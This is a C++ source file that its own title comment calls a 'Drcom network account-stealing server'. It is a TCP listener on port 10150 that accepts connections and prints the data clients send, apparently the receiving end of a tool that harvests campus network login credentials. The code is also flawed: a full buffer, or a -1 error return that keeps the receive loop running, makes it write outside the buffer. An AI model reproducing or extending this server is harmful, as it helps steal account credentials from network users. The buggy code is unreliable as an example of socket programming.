// Drcom网络盗号服务器.cpp : 定义控制台应用程序的入口点。
//

#include "SockJolly.h"
#include <iostream>
using namespace std;
#ifdef _WIN32
#include <Winsock2.h>
#pragma comment(lib,"ws2_32.lib")
typedef int socklen_t;
#else
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#define INVALID_SOCKET  (SOCKET)(~0)
#define SOCKET_ERROR            (-1)
typedef unsigned int SOCKET;
#endif // _WIN32


//TCP_Server
const int PORT = 10150;

#ifdef _WIN32
int REQ_QUIT = 10054;
#else
int REQ_QUIT = 104;
#endif

int main()
{
	SockJolly sock;
	int nRes = sock.Create(PORT);
	if (nRes == SOCKET_ERROR) {
		cout << "Bind Error=" << WSAGetLastError() << endl;
		return 0;
	}
	sock.Listen();

	char szIP[20];
	UINT nPort;
	cout << "Server Start!" << endl;
	while (true)
	{
		SockJolly socka;
		sock.Accept(socka, szIP, &nPort);

		//正常情况：
		cout << "Client Login：" << szIP << "-" << nPort << endl;
		char sAccept[1024 * 11] = { 0 };
		char FileName[64];
		while (nRes = socka.Receive(sAccept,sizeof(sAccept)))
		{
			sAccept[nRes] = '\0';
			cout << szIP << ": " << sAccept << endl;
		}
		cout << WSAGetLastError() << endl;
		if (WSAGetLastError() == REQ_QUIT)
			cout << szIP << " 已断开连接！" << endl << endl;
	}
}
